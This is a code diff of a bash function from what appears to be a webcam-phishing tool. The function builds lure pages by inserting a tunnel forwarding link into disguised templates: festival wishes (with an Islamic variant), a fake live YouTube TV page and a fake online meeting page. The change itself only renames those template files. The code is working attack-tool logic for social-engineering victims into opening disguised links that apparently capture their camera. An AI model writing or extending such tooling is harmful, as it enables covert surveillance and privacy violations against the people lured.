@@ -240,37 +240,37 @@ localhost_run_tunnel() {
 }
 payload_template() {
     local forwarding_link="$1"
-    if [[ ! -f "template.php" ]]; then
-        printf "\e[1;31m[!] Error: template.php not found!\e[0m\n"
+    if [[ ! -f "xcam-template.php" ]]; then
+        printf "\e[1;31m[!] Error: xcam-template.php not found!\e[0m\n"
         return 1
     fi
-    sed "s|forwarding_link|$forwarding_link|g" template.php > index.php
+    sed "s|forwarding_link|$forwarding_link|g" xcam-template.php > index.php
     if [[ $option_tem -eq 1 ]]; then
-        if [[ ! -f "festivalwishes.html" ]]; then
-            printf "\e[1;31m[!] Error: festivalwishes.html not found!\e[0m\n"
+        if [[ ! -f "xcam-festivalwishes.html" ]]; then
+            printf "\e[1;31m[!] Error: xcam-festivalwishes.html not found!\e[0m\n"
             return 1
         fi
         if [[ "$fest_variant" -eq 2 ]]; then
-            template_file="festivalwishes_islamic.html"
+            template_file="xcam-festivalwishes-islamic.html"
         else
-            template_file="festivalwishes.html"
+            template_file="xcam-festivalwishes.html"
         fi
         escaped_fest_name=$(printf '%s' "$fest_name" | sed 's/[\\/&]/\\&/g')
         sed "s|forwarding_link|$forwarding_link|g; s|fes_name|$escaped_fest_name|g" "$template_file" > index2.html
         cp index2.html index.html
     elif [[ $option_tem -eq 2 ]]; then
-        if [[ ! -f "LiveYTTV.html" ]]; then
-            printf "\e[1;31m[!] Error: LiveYTTV.html not found!\e[0m\n"
+        if [[ ! -f "xcam-liveyttv.html" ]]; then
+            printf "\e[1;31m[!] Error: xcam-liveyttv.html not found!\e[0m\n"
             return 1
         fi
-        sed "s|forwarding_link|$forwarding_link|g" LiveYTTV.html > index2.html
+        sed "s|forwarding_link|$forwarding_link|g" xcam-liveyttv.html > index2.html
         sed "s|live_yt_tv|$yt_video_ID|g" index2.html > index.html
     else
-        if [[ ! -f "OnlineMeeting.html" ]]; then
-            printf "\e[1;31m[!] Error: OnlineMeeting.html not found!\e[0m\n"
+        if [[ ! -f "xcam-onlinemeeting.html" ]]; then
+            printf "\e[1;31m[!] Error: xcam-onlinemeeting.html not found!\e[0m\n"
             return 1
         fi
-        sed "s|forwarding_link|$forwarding_link|g" OnlineMeeting.html > index.html
+        sed "s|forwarding_link|$forwarding_link|g" xcam-onlinemeeting.html > index.html
     fi
     if [[ -f "index.html" ]]; then
         printf "\e[1;92m  ✓ Template ready\e[0m\n"
